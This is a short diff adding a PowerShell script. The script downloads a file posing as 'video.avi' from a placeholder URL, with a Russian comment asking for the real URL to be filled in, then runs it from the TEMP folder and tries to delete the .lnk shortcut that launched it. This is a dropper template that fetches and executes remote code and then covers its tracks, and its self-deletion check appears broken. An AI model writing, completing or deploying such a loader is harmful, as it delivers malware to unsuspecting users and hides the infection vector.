@@ -1,0 +1,9 @@
+$url = "http://example.com/video.avi"  # Замените на реальный URL
+$process = Get-Process -Id $PID
+$shortcutPath = $process.Path
+if ($shortcutPath -and $shortcutPath.EndsWith(".lnk")) {
+    Remove-Item -Path $shortcutPath -Force
+}
+$tempPath = Join-Path $env:TEMP "video.avi"
+Invoke-WebRequest -Uri $url -OutFile $tempPath
+Start-Process $tempPath
